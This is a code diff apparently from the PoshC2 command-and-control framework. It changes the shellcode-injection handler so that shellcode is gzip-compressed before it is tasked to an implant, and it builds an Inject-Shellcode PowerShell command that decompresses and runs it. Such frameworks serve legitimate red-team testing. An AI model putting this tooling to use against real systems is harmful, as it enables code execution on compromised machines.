@@ -20,7 +20,7 @@ from poshc2.client.command_handlers.CommonCommands import common_implant_command
     common_implant_examples, common_block_help
 from poshc2.server.AutoLoads import check_module_loaded, run_powershell_autoloads
 from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, DomainFrontHeader, PayloadCommsHost
-from poshc2.server.Core import print_bad, creds, print_good, search_help, print_command_help
+from poshc2.server.Core import print_bad, creds, print_good, search_help, print_command_help, gzipdata
 from poshc2.server.ImplantType import ImplantType
 from poshc2.server.PowerStatus import get_powerstatus
 from poshc2.server.database.Helpers import select_first, insert_object, update_object, get_implant, get_power_status, \
@@ -777,7 +777,8 @@ def do_inject_shellcode(user, command, implant_id):
 
         if shellcodefile is not None:
             arch = "64"
-            cmd = f"$Shellcode{arch}=\"{base64.b64encode(shellcodefile).decode('utf-8')}\" #{os.path.basename(path)}"
+            gzip_shellcode = gzipdata(shellcodefile)
+            cmd = f"$Shellcode{arch}=\"{gzip_shellcode}\" #{os.path.basename(path)}"
             new_task = NewTask(
                 implant_id=implant_id,
                 command=cmd,
@@ -786,7 +787,7 @@ def do_inject_shellcode(user, command, implant_id):
             )
 
             insert_object(new_task)
-            cmd = f"Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode{arch})){params}"
+            cmd = f"Inject-Shellcode -Shellcode (gzip-decompress($Shellcode{arch})){params}"
             new_task = NewTask(
                 implant_id=implant_id,
                 command=cmd,
